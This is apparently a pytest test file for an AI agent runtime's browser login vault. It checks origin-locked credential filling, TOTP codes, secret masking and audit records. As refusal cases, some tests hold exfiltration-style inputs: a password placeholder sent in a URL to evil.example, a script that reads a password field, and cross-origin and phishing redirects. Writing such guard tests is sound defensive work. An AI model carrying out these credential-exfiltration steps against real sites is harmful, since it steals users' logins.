"""Login vault for the browser (Hermes H32): placeholders, origin rule, TOTP,
the MCP call guard, the result masking, the audit and ``login_vault_list``."""

from __future__ import annotations

import copy
import json

import pytest

from chuk_agents_runtime.login_vault import (
    LOGIN_VAULT_LIST_TOOL,
    LoginGuard,
    clean_origin,
    has_placeholder,
    normalize_origin,
    parse_totp_secret,
    register_login_vault_tool,
    totp_code,
)
from chuk_agents_runtime.mcp_client import MCPManager, MCPServerConfig, MCPToolInfo
from chuk_agents_runtime.registry import ToolRegistry
from chuk_agents_runtime.secrets import register_secrets_tools

PASSWORD = "hunter2-very-secret"
SHORT_PASSWORD = "pw1"
# RFC 6238 appendix B key ("12345678901234567890") in base32.
RFC_KEY = "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ"


class Access:
    """A LoginVaultAccess over a list, recording use and audit."""

    def __init__(self, entries: list[dict]) -> None:
        self.entries = entries
        self.used: list[str] = []
        self.audit: list[dict] = []

    def login_entries(self) -> list[dict]:
        return [
            {
                "id": e["id"],
                "origin": e["origin"],
                "username": e["username"],
                "label": e.get("label", ""),
                "has_totp": bool(e.get("totp_secret")),
                "created_at": 1,
                "last_used_at": None,
            }
            for e in self.entries
        ]

    def login_lookup(self, origin: str) -> list[dict]:
        return [dict(e) for e in self.entries if e["origin"] == origin]

    def login_used(self, entry_id: str) -> None:
        self.used.append(entry_id)

    def login_audit(self, record: dict) -> None:
        self.audit.append(record)


def _github(**extra) -> dict:
    return {
        "id": "e1",
        "origin": "https://github.com",
        "username": "octo@example.com",
        "password": PASSWORD,
        "totp_secret": RFC_KEY,
        "label": "work",
        **extra,
    }


def _tabs(url: str) -> str:
    return f"### Open tabs\n- 0: (current) [Sign in]({url})\n"


class FakeConnection:
    """A Playwright-like server: browser_tabs answers with ``page_url``; every
    other tool echoes its arguments (like the real ``Ran Playwright code``)."""

    page_url = "https://github.com/login"
    #: What the guard's field probe sees, by element ref. A ref not listed is
    #: a password input in the top page.
    elements: dict = {}
    #: The page URL after the next fill (a page that navigates away).
    url_after_fill: str | None = None

    def __init__(self, config: MCPServerConfig) -> None:
        self.config = config
        self.tools = [
            MCPToolInfo(n, "", {"type": "object", "properties": {}})
            for n in ("browser_tabs", "browser_type", "browser_fill_form", "browser_navigate", "browser_evaluate")
        ]
        self.error = None
        self.connected_once = True
        self.calls: list[tuple[str, dict]] = []
        self.probes: list[dict] = []

    def start(self) -> bool:
        return True

    def alive(self) -> bool:
        return True

    def call(self, tool, arguments):
        if tool == "browser_evaluate" and arguments.get("function", "").startswith("(el) => ({origin"):
            self.probes.append(copy.deepcopy(arguments))
            from chuk_agents_runtime.login_vault import normalize_origin

            found = self.elements.get(
                arguments.get("ref"),
                {"origin": normalize_origin(self.page_url), "tag": "input", "type": "password"},
            )
            return {"ok": True, "content": "### Result\n" + json.dumps(found) + "\n"}
        self.calls.append((tool, copy.deepcopy(arguments)))
        if tool == "browser_tabs":
            return {"ok": True, "content": _tabs(self.page_url)}
        if tool in ("browser_type", "browser_fill_form") and FakeConnection.url_after_fill:
            FakeConnection.page_url = FakeConnection.url_after_fill
            FakeConnection.url_after_fill = None
        return {
            "ok": True,
            "content": f"### Ran Playwright code\nawait page.fill({json.dumps(arguments)})",
        }

    def close(self) -> None:
        pass


def _manager(access: Access, page_url: str = "https://github.com/login") -> tuple[MCPManager, FakeConnection]:
    FakeConnection.page_url = page_url
    FakeConnection.elements = {}
    FakeConnection.url_after_fill = None
    manager = MCPManager(
        [MCPServerConfig(name="playwright", command="true")],
        connection_factory=FakeConnection,
    )
    manager.start(lazy=False)
    manager.call_guard = LoginGuard(access, session_key="s1", clock=lambda: 59.0)
    return manager, manager.connections["playwright"]


def _sent(conn: FakeConnection, tool: str) -> list[dict]:
    return [args for name, args in conn.calls if name == tool]


# -- origins --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "raw, want",
    [
        ("https://GitHub.com/login?x=1", "https://github.com"),
        ("https://github.com:443/", "https://github.com"),
        ("https://github.com:8443/a", "https://github.com:8443"),
        ("http://localhost:3000/x", "http://localhost:3000"),
        ("ftp://github.com", None),
        ("github.com", None),
        ("https://user:pw@github.com", None),
    ],
)
def test_normalize_origin(raw, want):
    assert normalize_origin(raw) == want


def test_clean_origin_refuses_plain_http_on_a_public_host():
    assert clean_origin("http://github.com") is None
    assert clean_origin("http://localhost:8080") == "http://localhost:8080"
    assert clean_origin("https://github.com/") == "https://github.com"


# -- TOTP -------------------------------------------------------------------------------


def test_totp_matches_the_rfc_6238_vectors():
    uri = f"otpauth://totp/x?secret={RFC_KEY}&digits=8"
    assert totp_code(uri, at=59) == "94287082"
    assert totp_code(uri, at=1111111109) == "07081804"
    assert totp_code(RFC_KEY.lower(), at=59) == "287082"
    assert totp_code("not base32 !", at=59) is None
    assert parse_totp_secret("otpauth://hotp/x?secret=" + RFC_KEY) is None


# -- the guard: fill -----------------------------------------------------------------------


def test_browser_type_fills_on_the_exact_origin_and_the_model_never_sees_the_value():
    access = Access([_github()])
    manager, conn = _manager(access)
    model_args = {"element": "Password", "ref": "e7", "text": "{{login:https://github.com:password}}"}
    kept = copy.deepcopy(model_args)
    result = manager.call("playwright", "browser_type", model_args)

    assert result["ok"] is True
    # The browser got the value...
    assert _sent(conn, "browser_type") == [{**kept, "text": PASSWORD}]
    # ...read the tab fresh right before it, probed the field in its own
    # frame, and read the tab again after the fill.
    assert [n for n, _ in conn.calls] == ["browser_tabs", "browser_type", "browser_tabs"]
    assert [p["ref"] for p in conn.probes] == ["e7"]
    # The model's own arguments (what the transcript stores) keep the placeholder.
    assert model_args == kept
    # The echoing result is masked.
    assert PASSWORD not in json.dumps(result)
    assert "[REDACTED:login:https://github.com:password]" in result["content"]
    assert result["login_vault"] == {"origin": "https://github.com", "filled_fields": 1}
    assert access.used == ["e1"]
    assert access.audit == [
        {
            "ts": 59.0,
            "session_key": "s1",
            "origin": "https://github.com",
            "entry_id": "e1",
            "fields": ["password"],
            "tool": "browser_type",
            "outcome": "filled",
        }
    ]
    assert PASSWORD not in json.dumps(access.audit)


def test_fill_form_resolves_username_password_and_totp():
    access = Access([_github()])
    manager, conn = _manager(access)
    fields = [
        {"name": "Email", "type": "textbox", "ref": "e1", "value": "{{login:https://github.com:username}}"},
        {"name": "Password", "type": "textbox", "ref": "e2", "value": "{{login:https://github.com:password}}"},
        {"name": "Code", "type": "textbox", "ref": "e3", "value": "{{login:https://github.com:totp}}"},
    ]
    result = manager.call("playwright", "browser_fill_form", {"fields": fields})
    sent = _sent(conn, "browser_fill_form")[0]["fields"]
    assert [f["value"] for f in sent] == ["octo@example.com", PASSWORD, "287082"]
    # The model's list was not changed in place.
    assert fields[1]["value"] == "{{login:https://github.com:password}}"
    text = json.dumps(result)
    assert PASSWORD not in text and "287082" not in text and "octo@example.com" not in text
    assert access.audit[0]["fields"] == ["username", "password", "totp"]


def test_a_short_password_is_masked_too():
    access = Access([_github(password=SHORT_PASSWORD)])
    manager, _conn = _manager(access)
    result = manager.call("playwright", "browser_type", {"ref": "e", "text": "{{login:https://github.com:password}}"})
    assert f'"{SHORT_PASSWORD}"' not in result["content"]


def test_the_label_picks_one_of_two_logins():
    access = Access([_github(), _github(id="e2", username="me@home.example", password="other-pass-123", label="home")])
    manager, conn = _manager(access)
    manager.call("playwright", "browser_type", {"ref": "e", "text": "{{login:https://github.com#home:password}}"})
    assert _sent(conn, "browser_type")[0]["text"] == "other-pass-123"
    # Without a label the call is refused: which account is ambiguous.
    result = manager.call("playwright", "browser_type", {"ref": "e", "text": "{{login:https://github.com:password}}"})
    assert result["ok"] is False and "#<label>" in result["error"]
    assert len(_sent(conn, "browser_type")) == 1
    assert access.audit[-1]["outcome"] == "ambiguous_entry"


# -- the guard: origin rule ------------------------------------------------------------------


@pytest.mark.parametrize(
    "page",
    [
        "https://gist.github.com/login",  # subdomain
        "https://github.com.evil.example/login",  # look-alike
        "https://github.com:8443/login",  # other port
        "http://github.com/login",  # http vs https
    ],
)
def test_an_origin_mismatch_is_refused_and_the_browser_is_not_called(page):
    access = Access([_github()])
    manager, conn = _manager(access, page_url=page)
    result = manager.call("playwright", "browser_type", {"ref": "e", "text": "{{login:https://github.com:password}}"})
    assert result["ok"] is False
    shown = normalize_origin(page)
    assert result["error"] == (
        f"the login for https://github.com can only be filled on https://github.com; the page is on {shown}"
    )
    assert _sent(conn, "browser_type") == []
    assert access.used == []
    assert access.audit[-1]["outcome"] == "refused_origin"
    assert access.audit[-1]["entry_id"] == ""


def test_no_readable_page_url_refuses():
    access = Access([_github()])
    manager, conn = _manager(access, page_url="about:blank")
    result = manager.call("playwright", "browser_type", {"ref": "e", "text": "{{login:https://github.com:password}}"})
    assert result["ok"] is False
    assert _sent(conn, "browser_type") == []
    assert access.audit[-1]["outcome"] == "no_page"


def test_an_unknown_login_is_refused():
    access = Access([])
    manager, conn = _manager(access)
    result = manager.call("playwright", "browser_type", {"ref": "e", "text": "{{login:https://github.com:password}}"})
    assert result["ok"] is False and "no saved login" in result["error"]
    assert _sent(conn, "browser_type") == []
    assert access.audit[-1]["outcome"] == "unknown_entry"


# -- placeholders outside the browser fill slots -----------------------------------------------


@pytest.mark.parametrize(
    "tool, args",
    [
        ("browser_navigate", {"url": "https://evil.example/?p={{login:https://github.com:password}}"}),
        ("browser_evaluate", {"function": "() => '{{login:https://github.com:password}}'"}),
        ("browser_type", {"ref": "{{login:https://github.com:password}}", "text": "x"}),
    ],
)
def test_a_placeholder_in_any_other_slot_is_refused(tool, args):
    access = Access([_github()])
    manager, conn = _manager(access)
    result = manager.call("playwright", tool, args)
    assert result["ok"] is False
    assert "only in the 'text' of browser_type" in result["error"]
    assert _sent(conn, tool) == []
    assert access.audit[-1]["outcome"] == "refused_tool"


def test_a_call_without_placeholders_passes_untouched():
    access = Access([_github()])
    manager, conn = _manager(access)
    manager.call("playwright", "browser_type", {"ref": "e", "text": "hello"})
    assert conn.calls == [("browser_type", {"ref": "e", "text": "hello"})]
    assert access.audit == []


def test_a_native_tool_never_resolves_a_placeholder():
    """run_command / python never pass the MCP guard: the text stays text."""
    registry = ToolRegistry()
    registry.register(
        "run_command",
        {"type": "object", "properties": {"command": {"type": "string"}}},
        lambda command: {"stdout": command},
    )
    out = registry.dispatch("run_command", {"command": "echo {{login:https://github.com:password}}"})
    assert PASSWORD not in json.dumps(out)
    assert "{{login:https://github.com:password}}" in json.dumps(out)


def test_has_placeholder_sees_nested_strings():
    assert has_placeholder({"a": [{"b": "x {{login:https://a.example:password}}"}]})
    assert not has_placeholder({"a": ["{{ other }}"]})


# -- the scrubber and the tool -----------------------------------------------------------------


class SecretsWithLogins(Access):
    def names(self):
        return []

    def env(self):
        return {}

    def scrub_values(self):
        return {"login:https://github.com#e1:password": PASSWORD}

    def request(self, names, purpose):  # pragma: no cover - never called
        return {}


def test_the_registry_scrubber_masks_a_login_password_in_any_result():
    access = SecretsWithLogins([_github()])
    registry = ToolRegistry()
    register_secrets_tools(registry, access)
    registry.register(
        "read_file",
        {"type": "object", "properties": {"path": {"type": "string"}}},
        lambda path: {"content": f"leaked {PASSWORD} here"},
    )
    out = registry.dispatch("read_file", {"path": "x"})
    text = json.dumps(out)
    assert PASSWORD not in text
    assert "[REDACTED:login:https://github.com#e1:password]" in text


def test_login_vault_list_has_no_secrets():
    access = SecretsWithLogins([_github()])
    registry = ToolRegistry()
    register_secrets_tools(registry, access)
    assert registry.has(LOGIN_VAULT_LIST_TOOL)
    assert LOGIN_VAULT_LIST_TOOL in registry.deferrable_names()
    out = registry.dispatch(LOGIN_VAULT_LIST_TOOL, {})
    text = json.dumps(out)
    assert PASSWORD not in text and RFC_KEY not in text
    assert "octo@example.com" in text and "https://github.com" in text
    assert '"has_totp": true' in text


def test_no_login_tool_without_login_access():
    registry = ToolRegistry()
    register_login_vault_tool(registry, object())
    assert not registry.has(LOGIN_VAULT_LIST_TOOL)


# -- M1: the field's own frame, the field type, a page that moves -------------------


def test_a_field_in_a_cross_origin_iframe_is_refused():
    access = Access([_github()])
    manager, conn = _manager(access)
    FakeConnection.elements = {
        "f1e3": {"origin": "https://evil.example", "tag": "input", "type": "password"}
    }
    result = manager.call(
        "playwright",
        "browser_type",
        {"element": "Password", "ref": "f1e3", "text": "{{login:https://github.com:password}}"},
    )
    assert result["ok"] is False and "evil.example" in result["error"]
    assert _sent(conn, "browser_type") == []
    assert access.audit[-1]["outcome"] == "refused_frame"
    assert PASSWORD not in json.dumps(conn.calls + conn.probes)


def test_a_field_without_a_ref_is_refused():
    access = Access([_github()])
    manager, conn = _manager(access)
    result = manager.call("playwright", "browser_type", {"text": "{{login:https://github.com:password}}"})
    assert result["ok"] is False and "ref" in result["error"]
    assert _sent(conn, "browser_type") == []


@pytest.mark.parametrize(
    "probe",
    [
        {"tag": "input", "type": "text"},
        {"tag": "textarea", "type": "textarea"},
        {"tag": "div", "type": ""},
    ],
)
def test_a_password_goes_only_into_a_password_input(probe):
    access = Access([_github()])
    manager, conn = _manager(access)
    FakeConnection.elements = {"e2": {"origin": "https://github.com", **probe}}
    result = manager.call(
        "playwright",
        "browser_fill_form",
        {"fields": [{"name": "Search", "type": "textbox", "ref": "e2",
                     "value": "{{login:https://github.com:password}}"}]},
    )
    assert result["ok"] is False and "password field" in result["error"]
    assert _sent(conn, "browser_fill_form") == []
    assert access.audit[-1]["outcome"] == "refused_field"


def test_a_username_may_go_into_a_text_input():
    access = Access([_github()])
    manager, conn = _manager(access)
    FakeConnection.elements = {"e1": {"origin": "https://github.com", "tag": "input", "type": "email"}}
    result = manager.call(
        "playwright", "browser_type", {"ref": "e1", "text": "{{login:https://github.com:username}}"}
    )
    assert result["ok"] is True


def test_a_page_that_leaves_the_origin_during_the_fill_stops_it():
    access = Access([_github()])
    manager, conn = _manager(access)
    FakeConnection.url_after_fill = "https://evil.example/phish"
    result = manager.call(
        "playwright", "browser_type", {"ref": "e7", "text": "{{login:https://github.com:password}}"}
    )
    assert result["ok"] is False and "left https://github.com" in result["error"]
    assert access.audit[-1]["outcome"] == "navigated_during_fill"
    assert PASSWORD not in json.dumps(result)


# -- M2: escaped echoes, short values, page scripts after a fill ---------------------


def test_json_and_js_escaped_echoes_are_masked():
    from chuk_agents_runtime.login_vault import mask_values

    value = 'p"a/s\'s\\w0rd-é'
    values = {"login:https://github.com:password": value}
    for echoed in (
        json.dumps({"v": value}),
        json.dumps({"v": value}, ensure_ascii=False),
        json.dumps(json.dumps({"v": value})),
        "x='" + value.replace("\\", "\\\\").replace("'", "\\'") + "'",
        "".join(f"\\u{ord(c):04x}" for c in value),
    ):
        masked = json.dumps(mask_values({"content": echoed}, values))
        assert "REDACTED" in masked, echoed
        assert "w0rd" not in masked, echoed


def test_scrubber_masks_escaped_forms_and_short_vault_values():
    from chuk_agents_runtime.secrets import Scrubber

    scrubber = Scrubber(
        lambda: {
            "API_KEY": 'k"ey/with\\escapes-1234',
            "SHORT_ENV": "abc",
            "login:https://github.com#e1:password": "pw1",
        }
    )
    out = scrubber.scrub_text(json.dumps({"a": 'k"ey/with\\escapes-1234'}) + " pw1 abc")
    assert "escapes-1234" not in out
    assert "[REDACTED:API_KEY]" in out
    assert "pw1" not in out and "[REDACTED:login:https://github.com#e1:password]" in out
    # An env secret under the floor still is not masked (unchanged rule).
    assert "abc" in out
    js = scrubber.scrub_text("".join(f"\\x{ord(c):02x}" for c in 'k"ey/with\\escapes-1234'))
    assert js == "[REDACTED:API_KEY]"


def test_page_scripts_are_blocked_on_an_origin_after_a_fill():
    access = Access([_github()])
    manager, conn = _manager(access)
    assert manager.call(
        "playwright", "browser_type", {"ref": "e7", "text": "{{login:https://github.com:password}}"}
    )["ok"] is True
    read_back = manager.call(
        "playwright",
        "browser_evaluate",
        {"function": "() => document.querySelector('input[type=password]').value"},
    )
    assert read_back["ok"] is False and "blocked" in read_back["error"]
    assert _sent(conn, "browser_evaluate") == []
    assert access.audit[-1]["outcome"] == "refused_script"
    # A second fill on the same origin still works (the guard's own probe
    # is not blocked).
    assert manager.call(
        "playwright", "browser_type", {"ref": "e8", "text": "{{login:https://github.com:username}}"}
    )["ok"] is True
    # Another origin is not affected.
    FakeConnection.page_url = "https://example.org/"
    assert manager.call("playwright", "browser_evaluate", {"function": "() => 1"})["ok"] is True


def test_page_scripts_pass_when_nothing_was_filled():
    access = Access([_github()])
    manager, conn = _manager(access)
    assert manager.call("playwright", "browser_evaluate", {"function": "() => 1"})["ok"] is True
    # No extra tab read without a fill.
    assert [n for n, _ in conn.calls] == ["browser_evaluate"]
